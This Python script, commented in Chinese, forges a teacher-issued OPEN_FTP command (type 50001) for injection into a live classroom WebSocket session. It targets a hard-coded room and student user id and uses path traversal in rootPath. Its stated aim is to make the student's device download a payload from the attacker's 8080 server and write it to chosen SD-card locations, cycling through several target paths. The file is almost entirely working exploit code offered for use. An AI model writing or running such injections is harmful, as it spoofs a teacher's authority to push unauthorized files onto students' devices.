# -*- coding: utf-8 -*-
"""inject_50001.py - 向活着的课堂 WS 注入 OPEN_FTP(50001)，rootPath 穿越。
目标: 让端侧从我们的 8080 下载载荷，并保存到 rootPath 指定位置。
"""
import json
import os
import sys
import time

BASE = os.path.dirname(os.path.abspath(__file__))
INJ = os.path.join(BASE, "ws_inject.txt")
LOG = os.path.join(BASE, "classroom.log")

OUR = "192.168.137.1"
HTTP_PORT = 8080
ROOT = sys.argv[1] if len(sys.argv) > 1 else "/mnt/sdcard/xhproxy"
ROOM = "UXHOVJJF"
UID = "2112229"


def build(room, root, port=HTTP_PORT):
    data = json.dumps({
        "hostName": OUR,
        "port": port,
        "rootPath": root,
        "downloadWaitTime": 3,
        "startLimitRate": 0.015,
    }, ensure_ascii=False)
    return json.dumps({
        "cmd": 0, "ct": "", "from": "teacher", "gt": 0, "cId": "",
        "smsg": {
            "classRoomId": room,
            "createTag": "default_tag",
            "data": data,
            "forward": 0,
            "senderId": 0,
            "type": 50001,
            "userIds": UID,
        },
    }, ensure_ascii=False)


def main():
    fames = [
        ("50001 rootPath=%s" % ROOT, build(ROOM, ROOT)),
        ("50001 alt-root=/sdcard/xuehai/keep", build(ROOM, "/sdcard/xuehai/keep")),
        ("50001 alt-root=/sdcard", build(ROOM, "/sdcard")),
    ]
    for name, js in fames:
        with open(INJ, "w", encoding="utf-8") as f:
            f.write(js)
        print("INJ %s" % name, flush=True)
        time.sleep(12)
    print("done", flush=True)


if __name__ == "__main__":
    main()
